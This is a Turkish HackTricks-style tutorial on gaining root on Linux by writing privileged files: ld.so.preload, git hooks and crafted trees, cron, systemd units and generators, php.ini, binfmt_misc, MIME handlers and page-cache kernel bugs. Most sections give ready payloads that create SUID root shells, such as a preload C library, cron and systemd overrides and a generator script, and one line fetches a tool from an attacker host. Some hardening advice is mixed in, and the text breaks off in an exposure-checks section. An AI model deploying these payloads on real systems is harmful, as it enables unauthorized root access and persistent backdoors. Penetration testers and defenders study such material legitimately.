# Root'a İstediğin Dosyayı Yazma

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`, dynamic linker'ın diğer shared object'lerden önce yüklediği shared object'lerin sistem genelindeki listesidir. Secure-execution mode, preloading için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir library path'i her durumda geçerli bir SUID-binary tekniği değildir.\
Bu dosyayı oluşturabilir veya değiştirebilirsen, dosyayı yükleyen bir process, listelenen library'yi diğer shared object'lerinden önce yükler ve böylece o process'in bağlamında code execution sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks**, commit ve merge işlemleri de dahil olmak üzere bir depodaki olaylar için çalıştırılan yürütülebilir betiklerdir. **Ayrıcalıklı bir betik veya kullanıcı** bu işlemleri gerçekleştiriyorsa ve bir saldırgan **`.git` klasörüne yazabiliyorsa**, hook **privilege escalation** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git deposundaki **`.git/hooks`** içinde **bir betik oluşturmak** mümkündür:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export path traversal

Ayrıcalıklı bir senkronizasyon servisi checkout yapmaktan kaçınarak bunun yerine saldırganın etkileyebildiği bir repository’yi `git ls-tree` ile listeleyebilir, her blob’u `git cat-file` ile okuyabilir, bildirilen pathname’i bir staging dizinine ekleyip dosyayı kendisi yazabilir. `-c safe.directory=*` (Git’in farklı sahipli repository’ler için uyguladığı korumayı devre dışı bırakır) seçeneğini hedef containment kontrolü olmamasıyla birleştirdiğinde, bu durum **senkronizasyon servisinin ayrıcalıklarıyla arbitrary file write** yapılmasına yol açar. Mutlak bir tree-entry adı, Python’daki `os.path.join(stage, name)` çağrısının `stage` değerini yok saymasına neden olur; `../` içeren göreli bir ad ise dosya sistemi yolu çözümlerken dizin dışına çıkar. Uygulama, Git’ten checkout etmesini istemek yerine raw tree’yi diske yazdığı için checkout sırasında yapılan pathname reddi, yazma noktasını korumaz.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Root servislerinde, timer’larda, deployment agent’larında, template importer’larında ve backup/restore işlerinde şu kod kalıbını arayın:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Bir tree girdisi `<mode> SP <name> NUL <raw object ID>` biçiminde kodlanır. `git hash-object --literally` seçeneği, normal ayrıştırmanın veya `git fsck` komutunun reddedebileceği object verilerine bilerek izin verir; bu nedenle geçici bir clone, dosya adı mutlak hedef olan bir tree oluşturabilir. Bu örnek bir cron dosyası blob'u oluşturur, hazırlanmış tree'yi bir commit içine sarar ve bir branch'i bu commit'e taşır; exploit için yine de ayrıcalıklı işin kullandığı bir repository'yi güncelleme izni ve bozuk object'i kabul eden bir Git server gerekir.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening hem repository alımını hem de son dosya sistemi işlemini kapsamalıdır:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` yerine hizmetin güvenmesi gereken belirli repository'leri tanımlayın ve mümkün olduğunda repository işlemlerini root ayrıcalıkları olmadan yürütün.
- Materialization işleminden önce mutlak adları ve `.` veya `..` bileşeni içeren tüm yolları reddedin. Yolu birleştirdikten sonra canonicalize edin ve hedefin amaçlanan root dizininin altında kaldığını doğrulayın.
- Kontrol edip ardından açma işlemindeki symlink yarışlarından kaçının: güvenilen bir dizin tanıtıcısına göreli olarak açın ve Linux'ta saldırganın kontrolündeki yollar için `RESOLVE_BENEATH` ile `RESOLVE_NO_SYMLINKS` kullanan `openat2()` kullanın.
- Plumbing çıktısından checkout işlemini yeniden uygulamak yerine, yalıtılmış bir dizinde normal checkout yapmayı tercih edin. Ham nesne alımı gerekiyorsa `receive.fsckObjects=true` gibi alım tarafı doğrulamasını etkinleştirin; hazırlanmış ağaçları reddetmek için gerekli yol adıyla ilgili `receive.fsck.*` bulgularını önemsemeyecek şekilde ayarlamayın.

### Ayrıcalıklı yapılandırma dağıtımı

Bazı yönetim hizmetleri, amaçlanan sistem durumunu bir yapılandırma dosyasında saklar ve daha sonra bu dosyayı yükseltilmiş ayrıcalıklarla dağıtır. Örneğin, [openmediavault yapılandırmayı `/etc/openmediavault/config.xml` içinde saklar](https://docs.openmediavault.org/en/7.x/faq.html) ve [RPC arayüzü](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) hizmet değişikliklerini uygulayabilir. Daha düşük ayrıcalıklı bir hesap bu dosyaya yazabiliyor veya dosyayı değiştirebiliyorsa, yetkili bir dağıtım isteğinde bulunup bulunamayacağını ve seçilen modülün değiştirilmiş alanı root olarak kullanıp kullanmadığını inceleyin. SSH hesap anahtarları, zamanlanmış komutlar ve paket kurulumu için farklı önkoşullar vardır; yalnızca dosyanın bulunması veya XML dosyasının yazılabilir olması bunlardan herhangi birini kanıtlamaz. Dosya ve üst dizin izinlerini, çağıranın gruplarını ve RPC yetkilendirmesini, kurulu sürümü ve gerçek tüketiciyi kontrol edin; envanter çıkarırken yapılandırmayı düzenlemeyin veya bir uygulama işlemi başlatmayın.

`/etc/fail2ban/action.d/` altındaki Fail2Ban action tanımları da ayrıcalıklı bir yapılandırma sınırıdır. Bu dizine yazabilen ve dizinde arama yapabilen bir kullanıcı, bir action tanımını değiştirebilir veya üzerine yazan yeni bir tanım ekleyebilir; ancak yalnızca dizin izinleri kod yürütüldüğünü kanıtlamaz. Etkin bir jail'in gerçekten etkilenen action'ı seçtiğini, Fail2Ban hizmetinin bunu daha yüksek ayrıcalıklarla yürüttüğünü ve yetkili bir yeniden yükleme/yeniden başlatma işlemiyle birlikte eşleşen bir ban olayının gerçekleşeceğini doğrulayın. Fail2Ban'i yeniden başlatmaya yönelik ilgisiz bir sudo izni, yalnızca tam olarak ilgili hizmet çağrısı için geçerliyse ve değiştirilen tanım yükleniyorsa önem taşır. [Fail2Ban'in action yapılandırması](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5), action dizini ile jail arasındaki ilişkiyi açıklar; [örnek action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf), `actionban`'in ban durumunda hizmet kullanıcısının haklarıyla çalıştığını gösterir. Envanter çıkarırken action'ları değiştirmeden veya ban tetiklemeden izinleri ve etkin yapılandırmayı inceleyin.

Etkin bir Fail2Ban jail'i WHOIS ile zenginleştirilmiş bir mail action'ı kullandığında ayrı bir sınır oluşur. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm), GNU mailutils `mail` aracına aktarılan güvenilmeyen WHOIS metniyle ilgiliydi; aracın escape işlemesi bir komut çalıştırabiliyordu. Daha düşük ayrıcalıklı bir dosya yazarı, **seçilen WHOIS istemcisinin** sunucu geçersiz kılma yapılandırmasını değiştirebiliyorsa yanıtı etkileyebilir; [Debian'ın `whois.conf(5)` belgesi](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) bu tür dosyalardan birini açıklar, ancak dosyanın konumu ve kullanımı kuruluma göre değişir. Etkin jail/action'ı, hizmet kimliğini, kullanılan WHOIS istemcisini ve yapılandırma yolunu, mail uygulamasını, yanıtın kontrol edilebilirliğini ve kurulu satıcı düzeltmesini veya backport'u inceleyin. Yazılabilir bir WHOIS yapılandırma dosyası, Fail2Ban sürümü veya tek başına bir mail action'ı bu zinciri kanıtlamaz; pasif envanter çıkarırken harici bir sunucuya sorgu göndermekten veya ban tetiklemekten kaçının.

### TFTP ile dosya oluşturma ve ayrıcalıklı paket hook'ları

Erişilebilir bir TFTP hizmeti, **etkin** tftpd-hpa ayarları root olarak çalışacak, dosya sistemi root dizinini `--secure` dizini olarak gösterecek ve `--create` seçeneğini etkinleştirecek biçimdeyse container veya yerel kullanıcı sınırını aşabilir. [tftpd-hpa kılavuzu](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) dosya oluşturma ve kullanıcı seçeneklerini açıklar. Bu, `/etc/apt/apt.conf.d/` dahil olmak üzere ayrıcalıklı bir yapılandırma dizininde yeni dosya oluşturmak için kullanılabilir; mevcut bir dosyanın üzerine yazmak yine de mümkün olmayabilir. [APT yapılandırma kılavuzu](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) `APT::Update::Pre-Invoke` komutlarını açıklar. Root olarak çalıştırılan bir `apt update`, **yalnızca** yeni yapılandırma dosyasını okuması durumunda daha yüksek ayrıcalıklı tüketici olabilir. Çalışan daemon'un gerçek argümanlarını ve kimliğini, ağ erişilebilirliğini ve filtrelemeyi, hedef dizin oluşturma politikasını, APT'nin etkin yapılandırma kapsamını ve sonraki ayrıcalıklı çağrıyı doğrulayın. Varsayılan bir dosya, yazılabilir hedef dizini veya zamanlanmış APT komutu tek başına tüm yolu kanıtlamaz. Pasif inceleme sırasında dosya yüklemeden veya APT'yi çalıştırmadan yalnızca sınırlandırılmış yerel yapılandırma ve meta verileri okuyun.

### Cron ve zaman dosyaları

Root'un çalıştırdığı **cron ile ilgili dosyalara yazabiliyorsanız**, işin bir sonraki çalışmasında genellikle kod yürütme elde edebilirsiniz. İlgi çekici hedefler şunlardır:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root'un `/var/spool/cron/` veya `/var/spool/cron/crontabs/` altındaki kendi crontab dosyası
- `systemd` timer'ları ve tetikledikleri hizmetler

Hızlı kontroller:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipik kötüye kullanım yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job ekleme**
- `run-parts` tarafından zaten çalıştırılan bir scripti **değiştirme**
- Başlattığı scripti veya binary'yi değiştirerek **mevcut bir timer hedefini backdoor'lama**

Minimal cron payload örneği:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notlar:

- `run-parts` genellikle adında nokta bulunan dosyaları yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemlerde klasik cron yerine `systemd` timer'ları kullanılır, ancak kötüye kullanım fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirmek**.<sup>[[20]](#references)</sup>

### Service ve Socket dosyaları

**`systemd` unit dosyalarına** veya bunların başvurduğu dosyalara yazabiliyorsanız, unit'i yeniden yükleyip yeniden başlatarak ya da service/socket etkinleştirme yolunun tetiklenmesini bekleyerek root olarak code execution elde edebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL'ler de dahil olmak üzere sistem unit dizininin kendisinde yazma ve arama erişiminiz olup olmadığını kontrol edin: dizinin okunması/listelenmesi engellense bile bir kullanıcı `/etc/systemd/system` içinde yeni bir unit oluşturabilir. Ancak bu yol tek başına hiçbir şeyi başlatmaz. Sistem yöneticisinin yeni unit'i yükleyeceğini, çağıranın bu unit adı için root yetkisi sağlayan etkin bir `systemctl start` veya `restart` iznine (ya da başka bir ayrıcalıklı etkinleştirme yoluna) sahip olduğunu ve service'in hedeflenen kimlikle çalıştığını doğrulayın. Diskte değiştirilen mevcut bir loaded unit için `daemon-reload` gerekebilir; yeni adlandırılan bir unit'in yüklenme davranışı farklıdır. Wildcard içeren bir restart kuralını yeterli kabul etmeden önce sudo argümanlarını ve hariç tutmaları dikkatlice inceleyin. [systemd unit arama yoluna](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) ve [systemctl yükleme ve yeniden yükleme semantiğine](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) bakın.

İlgi çekici hedefler:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki Drop-in override'ları
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından başvurulan service script'leri/binary'leri
- Root service tarafından yüklenen, yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Yaygın kötüye kullanım yolları:

- Root tarafından sahip olunan ve değiştirebildiğiniz bir service unit içindeki **`ExecStart=` değerinin üzerine yazma**
- Kötü amaçlı bir `ExecStart=` içeren **drop-in override ekleme** ve önce eskisini temizleme
- Unit tarafından zaten başvurulan script/binary dosyasına **backdoor ekleme**
- Socket bir bağlantı aldığında başlayan ilgili `.service` dosyasını değiştirerek **socket-activated service'i ele geçirme**

Kötü amaçlı override örneği:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipik etkinleştirme akışı:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Kendiniz servisleri yeniden başlatamıyor ancak socket-activated bir unit dosyasını düzenleyebiliyorsanız, backdoor eklenmiş servisin root olarak çalışmasını tetiklemek için yalnızca **bir istemci bağlantısını beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### systemd generator dizinleri

**System generator’lar**, unit dosyalarını yüklemeden önce, hem açılış sırasında hem de yapılandırma yeniden yüklemelerinde system manager tarafından başlatılan çalıştırılabilir dosyalardır. Bu nedenle, bir system-generator dizinine (veya mevcut bir çalıştırılabilir generator’a) yazma erişimi, denetim sırasında yalnızca `*.service` ve `*.timer` dosyalarına bakıldığında kolayca gözden kaçabilecek, doğrudan root-code-execution olanağı sağlar.<sup>[[35]](#references)[[36]](#references)</sup>

Genel arama sırası `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` ve `/usr/lib/systemd/system-generators/` şeklindedir (bazı dağıtımlarda `/lib/systemd/system-generators/`, `/usr` birleştirmesi üzerinden sunulur). Daha önceki bir dizindeki aynı ada sahip çalıştırılabilir dosya, sonraki dizindekini gölgeler. Bu **girdi çalıştırılabilir dosya dizinlerini**, generator’ların ürettiği geçici unit çıktılarını içeren `/run/systemd/generator`, `/run/systemd/generator.early` ve `/run/systemd/generator.late` dizinleriyle karıştırmayın.<sup>[[35]](#references)</sup>

Hızlı kontroller:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Yeni oluşturulan bir generator'ın executable biti ayarlanmalıdır. Write primitive baytları kontrol ediyor ancak mode'u kontrol etmiyorsa, zaten executable olan bir generator'ı hedefleyin; dosyayı yerinde truncate etmek normalde metadata'sını korur. Dizinin kendisi yazılabilir durumdaysa yeni bir giriş oluşturup executable olarak işaretleyin.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload` komutunu **system** manager'a karşı çalıştırmak için uygun yetkilendirme gerekir; ancak bu komut her system generator'ı yeniden çalıştırır. Aksi durumda ayrıcalıklı bir reload, paket işlemi veya reboot bekleyin. `~/.config/systemd/user-generators/` gibi user-generator dizinleri user manager altında çalışır ve **tek başlarına root yetkisi sağlamaz**.<sup>[[35]](#references)</sup>

Hardening ve hunting için yalnızca son dosyanın mode bitlerini değil, her path bileşenini ve ACL'yi doğrulayın; generator'ların hash'lerini ve paket sahipliğini baseline olarak kaydedin; tüm system-generator girdi dizinlerindeki oluşturma, yeniden adlandırma, içerik veya izin değişiklikleri için alarm oluşturun. Yazma işlemini izlemek önemlidir; çünkü one-shot generator çalıştıktan sonra kendini silebilir, `/run/systemd/generator*` altındaki oluşturulan unit tree ise bir sonraki reload'da yeniden oluşturulur.<sup>[[35]](#references)[[36]](#references)</sup>

### Ayrıcalıklı bir PHP sandbox tarafından kullanılan kısıtlayıcı `php.ini` dosyasını üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP'yi **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki kodda hâlâ **herhangi bir yazma primitive'i** (örneğin `file_put_contents`) varsa ve daemon'ın kullandığı **tam `php.ini` path'ine** erişebiliyorsanız, kısıtlamaları kaldırmak için **bu config dosyasının üzerine yazabilir**, ardından yükseltilmiş ayrıcalıklarla çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Tipik akış:

1. İlk payload sandbox config'inin üzerine yazar.
2. Tehlikeli işlevler yeniden etkinleştirildikten sonra ikinci payload kodu çalıştırır.

Minimal örnek (daemon'ın kullandığı path'i değiştirin):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Daemon root olarak çalışıyorsa (veya root sahipli yolları doğruluyorsa), ikinci çalıştırma root bağlamı sağlar. Sandbox içindeki çalışma zamanı hâlâ dosya yazabiliyorsa bu, temelde **yapılandırma üzerine yazarak yetki yükseltme** yöntemidir.

### binfmt_misc

`binfmt_misc`, kayıtları `/proc/sys/fs/binfmt_misc` altında sunar; her kayıt bir dosya türü desenini bir yorumlayıcıyla ilişkilendirir. Yetki üzerindeki etki, kaydı kimin değiştirebildiğine ve eşleşen dosyayı hangi sürecin daha sonra çalıştırdığına bağlıdır. Bu nedenle, bunu bir yetki yükseltme yolu olarak değerlendirmeden önce bu koşulların sağlandığını doğrulayın.<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE` yeteneğine sahip çalıştırılabilir bir yardımcı program, çağıranın bu düğüme doğrudan yazamadığı durumlarda bile, çağıranın kontrolündeki verileri kabul edip `/proc/sys/fs/binfmt_misc/register` konumuna yazıyorsa ayrı bir kayıt yolu oluşturabilir. Yardımcı programı envanter çıkarırken çalıştırmadan, girdilerini ve yazma davranışını inceleyin. Kayıtlı bir kural `C` bayrağını kullanıyorsa, yorumlayıcı eşleşen ikili dosyaya dayalı kimlik bilgileri alır; bu nedenle root sahipli bir SUID eşleşmesi, çağıranın kontrolündeki bir yorumlayıcıyı root olarak çalıştırabilir. `binfmt_misc` bağlamasını ve kayıt politikasını, yardımcı programın etkin yeteneğini, tam kuralı ve yorumlayıcı yolunu, çalıştırılabilir SUID hedefini ve `no_new_privs` ya da `nosuid` bağlamasının SUID geçişini engelleyip engellemediğini doğrulayın. Tek başına bir yetenek biti veya gömülü yol dizgesi yalnızca inceleme için ipucudur.<sup>[[21]](#references)</sup> SUID'yi engelleyen koşullar için [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) sayfasına bakın.

### Şema işleyicilerinin üzerine yazma (http: veya https: gibi)

Masaüstü ortamları, URI şemaları için bir uygulama seçmek üzere MIME ilişkilendirmelerini ve masaüstü girdilerini kullanır; ilgili kullanıcı başına yapılandırma ve masaüstü girdisi dizinlerine yazabilen bir saldırgan, bu şemaları kontrolündeki bir başlatıcıya yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını değiştirerek HTTP ve HTTPS URL işleyicilerini kötü amaçlı bir dosyaya yönlendirmek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`), bir kullanıcının tıklamasının bu masaüstü girdisini çalıştırmasına yol açabilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root'un kullanıcı tarafından yazılabilir script'leri/binary'leri çalıştırması

Ayrıcalıklı bir iş akışı `/bin/sh /home/username/.../script` gibi bir komut (veya ayrıcalıksız bir kullanıcıya ait dizindeki herhangi bir binary'yi) çalıştırıyorsa, bunu ele geçirebilirsiniz:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit edin:** Root'un kullanıcı tarafından kontrol edilen yolları çağırdığını yakalamak için süreçleri pspy ile izleyin.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Yazılabilirliği doğrulayın:** hedef dosyanın ve dizininizin kullanıcı hesabınıza ait olduğundan ve yazılabilir olduğundan emin olun.
- **Hedefi ele geçirin:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan bir payload (veya başka bir root işlemi) bırakın, ardından izinleri geri yükleyin:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Ayrıcalıklı eylemi tetikleyin** (ör. helper'ı başlatan bir UI düğmesine basın). Root ele geçirilmiş yolu yeniden çalıştırdığında, `./rootshell -p` ile yükseltilmiş shell'i alın.

### Ayrıcalıklı binary'lerde yalnızca page cache'i değiştirme

Bazı kernel açıkları dosyayı **diskte** değiştirmez. Bunun yerine, okunabilir bir dosyanın yalnızca **page cache kopyasını** değiştirmenize olanak tanır. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, sonraki çalıştırma bellekteki saldırgan denetimli byte'ları çalıştırabilir ve diskteki dosya hash'i değişmemiş olsa bile ayrıcalıkları yükseltebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu **yalnızca çalışma zamanında geçerli bir dosya yazma primitive'i** olarak düşünmek faydalıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve diskteki byte'lar değişmez
- **Bellek kirlenir**: önbelleğe alınmış sayfayı okuyan/çalıştıran işlemler, saldırgan tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik yeniden başlatma veya cache'in boşaltılmasıyla kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** açıklarının arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race koşuluna dayanıyordu
- Dirty Pipe'da yazma konumu kısıtlamaları vardı
- Açığın bulunduğu yol, dosyaya bağlı önbelleğe alınmış sayfalara doğrudan yazma olanağı veriyorsa, yalnızca page cache'i hedefleyen bir primitive daha güvenilir olabilir

#### Genel privesc akışı

1. **Dosyaya bağlı page cache sayfalarına** yazabilen bir kernel primitive'i elde edin
2. Bunu **okunabilir, ayrıcalıklı bir binary** veya root tarafından çalıştırılan başka bir dosyaya karşı kullanın
3. Sayfa cache'den atılmadan önce çalıştırmayı tetikleyin
4. Diskteki dosya değiştirilmemiş görünürken root olarak kod yürütme elde edin

Genellikle değeri yüksek hedefler:

- **setuid-root** binary'ler
- **root servisleri** tarafından başlatılan helper'lar
- **Host kernel/page cache'ini paylaşan container'lardan** sıkça çalıştırılan binary'ler

#### AF_ALG + `splice()` örnek yolu

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Açığın bulunduğu yol, Linux crypto userspace API'sindeydi (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, okunabilir bir dosyadaki page-cache sayfalarına ait referansları crypto TX scatterlist'ine taşıyabilir
- Yerinde çalışan `algif_aead` decrypt yolu kaynak ve hedef buffer'ları yeniden kullandı
- Ardından `authencesn`, hedef tag bölgesine yazdı
- Bu bölge hâlâ splice edilmiş, dosyaya bağlı sayfalara referans verdiğinde, yazma işlemi **hedef dosyanın page cache'ine** ulaştı

Dolayısıyla ilginç olan, CVE'nin kendisi değil, şu örüntüdür:

- **Dosyaya bağlı cache sayfalarını bir kernel alt sistemine aktarın**
- Alt sistemin bunları **yazılabilir çıktı** olarak ele almasını sağlayın
- Bellekte küçük ve kontrollü bir üzerine yazma işlemi gerçekleştirin

Herkese açık PoC, `/usr/bin/su` dosyasını bellekte yamamak için tekrarlanan **4-byte yazmalar** kullandı ve ardından dosyayı çalıştırdı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone örnek yolu

DirtyClone (CVE-2026-43503), aynı **yalnızca page cache'e yazma yoluyla root elde etme** örüntüsünün başka bir çeşidini gösterir; ancak bu kez hedef `AF_ALG` yerine **IPsec ESP decrypt** işlemidir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Önemli teknik, **metadata-laundering adımıdır**:

- `splice()`, **salt okunur, dosyaya bağlı bir page-cache sayfasını** ESP-in-UDP paketine yerleştirir
- Orijinal DirtyFrag azaltımı, `esp_input()` işleminin **decrypt öncesinde kopyalama yapmasını** sağlamak için skb'yi `SKBFL_SHARED_FRAG` ile etiketledi
- netfilter `TEE`, paketi `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden çoğaltır
- Clone, **aynı fiziksel page-cache referansını** korur ama `SKBFL_SHARED_FRAG` etiketini kaybeder
- Bunun üzerine `esp_input()`, clone'u güvenli kabul eder ve dosyaya bağlı sayfanın üzerinde **yerinde `cbc(aes)` decrypt** çalıştırır

Dolayısıyla incelemeyi yapanlar için çıkarılacak ders CVE'den daha geneldir: Bir azaltım, bir işlemin önce kopyalama gerektirip gerektirmediğine karar vermek için **skb/sayfa metadata'sına** dayanıyorsa, arka plandaki sayfayı korurken metadata'yı düşüren herhangi bir **clone/copy yolu** yazma primitive'ini fark edilmeden yeniden açabilir.

Tipik exploitation akışı:

1. Özel bir network namespace içinde **`CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` çalıştırın
2. Loopback'i etkinleştirin ve `mangle/OUTPUT` içinde bir **netfilter `TEE` kuralı** kurun
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA'leri** kurun
4. Her hedef 4-byte word'ü SA `seq_hi` alanında kodlayın (DirtyFrag'in word seçme tekniği)
5. TEE clone'un `esp_input()`'e ulaşmasını ve **yerinde decrypt** yapmasını sağlayacak şekilde splice edilmiş ESP-in-UDP paketini gönderin
6. `/usr/bin/su` dosyasının veya başka bir ayrıcalıklı çalıştırılabilir dosyanın page cache kopyası saldırgan denetimli kod içerene kadar tekrarlayın

Operasyonel olarak etki, `AF_ALG` örneğindekiyle aynıdır: diskteki dosya temiz kalır; ancak `execve()` **değiştirilmiş page-cache byte'larını** kullanır ve root yetkisi verir.<sup>[[8]](#references)[[9]](#references)</sup>

Bu varyant için yararlı exposure kontrolleri:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Kısa vadede saldırı yüzeyini azaltma da burada yola özgüdür: `48f6a5356a33` içeren bir kernel sürümüne yükseltmek clone yolunu düzeltirken, `xt_TEE` otomatik yüklemesini engellemek **flag-laundering step**'i, `esp4` / `esp6` yüklemesini engellemek ise **decrypt sink**'i ortadan kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Maruziyet ve hunting

Bu sınıftaki bir bug'dan şüpheleniyorsanız, yalnızca disk bütünlüğü kontrollerine güvenmeyin. Şunları da doğrulayın:

```bash
uname -r
